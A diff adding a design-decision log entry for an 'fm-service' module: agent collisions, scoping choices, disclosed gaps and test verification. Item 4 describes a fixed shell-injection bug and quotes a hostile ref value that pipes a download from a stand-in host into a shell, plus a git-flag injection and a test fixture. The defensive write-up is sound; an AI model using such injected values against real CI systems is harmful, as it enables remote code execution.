@@ -12691,6 +12691,144 @@ broader cross-package sanity pass before a milestone boundary is declared comple
 `GAUNTLET-LOG.md`'s own M9 pieces followed before each commit); this checkpoint is the concrete reason
 that practice matters, not a hypothetical one.
 
+## Q160 — M10 P4: `fm-service` module — the `domain-modeler`/`integration-architect` collision with
+`fm-core`, the `frameworks`/`artifactTypes` scoping calls, and two disclosed, pre-existing-pattern gaps
+
+`PLAN-M10.md` P4 asked this piece to ship `modules/fm-service/`'s own `domain-modeler`/
+`integration-architect` agents, `contract-test-cycle` workflow, `api-versioning` framework, OpenAPI/proto
+contract templates, and `contract:verify`/`api:breaking-change` checks. Several real decisions and one
+real, critic-found security defect came out of doing that faithfully rather than guessing.
+
+**1. `domain-modeler`/`integration-architect` are a real, pre-existing collision with `fm-core`, resolved
+the identical way `Q157` already resolved `frontend`'s.** `05` §5.2's own roster table marks
+`domain-modeler` `S(fm-service)` and `integration-architect` bare `S` (no module qualifier) — but that
+tier's own legend defines `S` as "installed with a module" (singular, always some module), and `19`
+§19.1's own shipped-modules table names `integration-architect` under fm-service's own "Adds" column, the
+only place naming which one. Read as the identical spec-terseness gap `Q88` already established for other
+`19` §19.1-vs-precise-table mismatches, not a deliberate "module-independent" signal — both ids are
+resolved the same way. `modules/fm-core/agents/{domain-modeler,integration-architect}.agent.yaml` already
+exist on disk (P1), unconditionally named in fm-core's own `provides.agents` even though fm-core is
+"always installed" regardless of specialised-module choice; both files' own doc comments already
+anticipated this exact mismatch, the identical "anticipatory scaffolding" pattern `frontend.agent.yaml`
+left in fm-core ahead of `fm-web` existing. This piece ships the real, authoritative copy of both under
+`modules/fm-service/agents/`, each with a real, distinguishing enhancement over fm-core's older copy
+(`domain-modeler` now produces evidence for `G-Integration` in addition to `G-Design`;
+`integration-architect` now declares the real `api-versioning` framework), and `@forge/agents`' own
+`loadAgentRegistry` resolves both to fm-service's copy by the identical alphabetical-module-scan
+mechanism `Q157` already verified empirically (`fm-core` sorts before `fm-service`) —
+`packages/agents/test/content/fm-service-roster.test.ts` confirms this directly, and
+`packages/extensions/test/module/fm-service.test.ts` pins the identical `resolveInstalledModules`
+install-order-dependent disagreement `Q157` already pinned for `frontend`. The residual gap this piece
+does not fix — fm-core's own stray `provides.agents` entries for both ids — is fm-core's own file, out of
+this piece's Surface, the same reasoning `Q157` already gives for `frontend`.
+
+**2. `provides.frameworks: [api-versioning]` only, not `integration-design`.** `19` §19.1's own worked
+`module.yaml` example (the literal fm-service illustration in that section) shows
+`frameworks: [ integration-design, api-versioning ]`, but `PLAN-M10.md` P4's own Surface names exactly one
+framework file to build, and no `integration-design` framework exists anywhere in this repository (not in
+`@forge/templates`' own 43-framework `FRAMEWORK_INDEX`, not under any module). Building an unrequested
+second framework would be exactly the "no scaffolding for its own sake" the build process forbids; the
+worked example is prose demonstrating `module.yaml`'s own shape, not itself a literal deliverable list the
+way the two named check ids explicitly are.
+
+**3. No new artifact type for the two OpenAPI/proto contract templates.** Both render the existing,
+already-registered `InterfaceContract` type rather than a new module-owned schema: unlike `fm-web`'s
+`ComponentSpec`/`UXReviewRecord` (real, structured fields no existing type had a home for), an OpenAPI/
+proto contract's own real structure lives inside the rendered document body (a fenced code block), not in
+front-matter fields a new JSON Schema would need to constrain — `InterfaceContract`'s own base template
+already names OpenAPI/proto/SDL as example contract kinds in prose. Because `InterfaceContract` is an
+EXISTING `@forge/schemas` registry type (unlike fm-web's two new ones), its `baseFrontMatterShape` types
+`created`/`updated` as a bare `date`, not the full ISO-8601 instant `19` §19.2's own `TemplateContext.now`
+carries — rendering `now` directly, the way fm-web's own templates correctly do for their own new,
+instant-typed schemas, would have reproduced `Q157` round 1's exact defect in the opposite direction. Both
+templates instead render `created`/`updated` from `TemplateContext.artifact.created`, the field `19`
+§19.2's own contract already documents as "resolved at render" by whichever caller populates it, already
+in the shape the concrete artifact type expects. `test/fm-service-templates.test.ts` proves both
+directions directly: a real, populated fixture validates against the real, production
+`interfaceContractSchema`, and a fixture that deliberately puts a full ISO instant in `artifact.created`
+(the wrong field shape for this schema) is genuinely rejected.
+
+**4. A real, critic-found shell-injection defect in `checks/api-breaking-change.check.yaml`, fixed before
+this piece's own commit — not a design question, recorded here because the fix reshaped the check's own
+`run:` script.** The check's own real mechanism (`19` §19.1's own "OpenAPI/proto templates" row's sibling
+check) diffs `docs/forge/specs/interfaces/` against a caller-configurable `FORGE_BASE_REF` env var
+(default `HEAD`) to catch a removed API path/method with no matching addition. The first draft built its
+own `git diff ${baseRef} -- ...` command as a JS template literal and ran it through Node's `execSync` —
+which always spawns a real shell (`/bin/sh -c`) regardless of any explicit `shell` option — so a hostile
+`FORGE_BASE_REF` (a value real CI systems routinely seed from an attacker-influenced ref/branch name,
+mirroring `GITHUB_BASE_REF`), e.g. `main; curl evil.sh|sh`, achieved real command execution, not merely a
+malformed `git diff` call. A fresh critic round (dispatched deliberately at the "hostile user" angle
+`QUALITY-BAR.md` names) found this; a second, independent critic round verified the fix rather than
+trusting the fix description. Fixed two ways, neither trusted alone: (1) `FORGE_BASE_REF` is validated
+against a real ref-name allowlist (`/^[A-Za-z0-9][A-Za-z0-9._\/-]*$/`) before use, falling back to `HEAD`
+outright for anything that does not match — closing both shell metacharacters and a leading `-` that could
+otherwise be read as a `git` flag (e.g. `--upload-pack=...`); (2) the git invocation itself now uses
+`execFileSync` with a real argv array, which never spawns a shell at all regardless of `baseRef`'s own
+content. `packages/engine/test/gates/fm-service-checks.test.ts` pins a real hostile `FORGE_BASE_REF`
+fixture (`"main; touch <sentinel>"`) directly, asserting both that the check still runs safely (falls back
+to `HEAD`, reports the real, unremarkable result) and that the sentinel file was never created — the
+second critic round confirmed this test genuinely exercises the vulnerable code path and would have
+failed against the original script, and that the allowlist still admits ordinary ref shapes (`v1.2.0`,
+`release/2.0`).
+
+**5. Two residual, disclosed-not-fixed gaps, confirmed by the second critic round to be pre-existing
+across every module already shipped in this repository, not unique to this piece.** (a) Neither agent's
+own `prompt.system`/`prompt.briefs` paths nor the new workflow's `brief:` paths resolve to a real file on
+disk — confirmed identical on `modules/fm-core/agents/architect.agent.yaml` and
+`modules/fm-core/agents/frontend.agent.yaml`, and confirmed that no command anywhere in `packages/`
+(`packages/cli/src/commands/agent.ts`'s own `referenceFindings` checks only `frameworks`/`skills`
+existence) validates a prompt/brief path at all yet. (b) No `README.md` or `tests/` directory exists under
+this module's own directory, though `19` §19.1's own module-layout diagram and §19.6 both name them —
+confirmed neither `modules/fm-core/` nor `modules/fm-web/` has either one either. Fixing either gap here
+alone, while the always-installed `fm-core` and the most recently, most rigorously reviewed `fm-web` both
+still lack it, would be inconsistent scope creep relative to established precedent, not a real fix.
+Recorded here for whichever later piece builds the real `forge agent/workflow validate`/
+`forge overlay validate` commands `05` §5.9/`19` §19.6's own rules actually belong to.
+
+**6. A real, previously-unexercised `agentValidateAll` gap the mandatory full-workspace test run (not
+either critic round) found: `05` §5.9's "declared frameworks exist" check has no notion of a module-
+owned framework at all.** `packages/cli/src/commands/agent.ts`'s own `agentValidateAll` cross-checks
+every agent's own `frameworks:` entry only against `@forge/templates`' core, project-wide
+`FRAMEWORK_INDEX` — confirmed directly, it never consults an installed module's own
+`provides.frameworks`. `integration-architect.agent.yaml`'s first draft listed `api-versioning` (this
+module's own real framework, whose own `owner_agent: integration-architect` genuinely names this role)
+under its own `frameworks:`, which is the first time any agent anywhere in this repository has ever
+named a module-owned rather than core framework there — and it broke `packages/cli/test/commands/
+agent.test.ts`'s and `packages/cli/test/e2e/init.test.ts`'s own real, complete-roster fixtures with a
+real, correctly-firing (if unwanted) `unknown-framework` finding, plus `packages/cli/test/bin.test.ts`'s
+real subprocess run of `forge agent validate --all`. Fixed by leaving `api-versioning` off this role's
+own `frameworks:` list — its ownership is still fully, honestly expressed by the framework's own
+`owner_agent` field and a new sentence in this role's own `mandate` naming it directly, and an agent's
+`frameworks:` list already does not always mirror a framework's own `owner_agent` in this codebase
+(`decomposition-boundaries`/`pattern-selection`/`communication-integration-patterns` each declare
+`owner_agent: architect` while `domain-modeler`/`integration-architect` also list them under their own
+`frameworks:`, an existing, accepted asymmetry) — not by making `agentValidateAll` module-aware, which
+would touch `packages/cli`, well outside this piece's own Surface. `packages/agents/test/content/
+fm-service-roster.test.ts` pins the real distinguishing fact directly against the agent's own `mandate`
+text instead of its `frameworks:` list. Whichever later piece makes `agentValidateAll` module-aware
+should revisit this.
+
+**Verification:** 42 real tests — `packages/extensions/test/module/fm-service.test.ts` (7),
+`packages/agents/test/content/fm-service-roster.test.ts` (9), `packages/engine/test/gates/
+fm-service-checks.test.ts` (10, including two real child-process executions of each check's own literal
+`run:` command against real pass/fail fixtures, a real temporary git repository for
+`api:breaking-change`, and the hostile-`FORGE_BASE_REF` regression), `test/fm-service-workflow.test.ts`
+(3, a real `parseWorkflow`/`compileRunPlan`/`runEngine` dry run against `FakePlatformAdapter` and a real
+temporary git repository, proving the workflow's own two explicit single-lane `merge` steps are
+structurally required — `runAgentStep`/`runCommandStep` never merge a lane's own content into
+`integrationPath` themselves, only an explicit `merge` step does, confirmed directly against
+`packages/engine/src/dispatch/steps.ts`), `test/fm-service-framework.test.ts` (6, `loadFramework`/
+`applyRules`/`score`/`killerRisk` against real fixture evidence cells, then the framework's own real
+`output_template` rendered through real Handlebars and validated against `@forge/schemas`' own real,
+production `adrSchema`), and `test/fm-service-templates.test.ts` (7). Whole-workspace `pnpm typecheck`
+(20/20 packages) is clean at commit time — earlier in this piece's own build it was not, but the
+failure was confirmed, by file-overlap, to belong entirely to a separate, concurrent, unrelated M10
+piece's own then-in-flight, uncommitted work in `packages/engine/src/interaction/session.ts` (none of
+that piece's own touched files appear anywhere in this piece's diff), and that piece resolved it on its
+own before this piece's own commit. `eslint --max-warnings 0`, `prettier --check`, and
+`node scripts/check-boundaries.mjs` all clean. `GAUNTLET-LOG.md`'s own `M10 P4` entry has the full
+round-by-round record.
+
 ## Q159 — M10 P17: `forge adopt` phase 5 VERIFICATION — no `verificationCommand` front-matter field
 exists (a corrected premise), the `kb`/`vcs`+`engine` layering split, the sandbox-clone location, and four
 disclosed scope narrowings
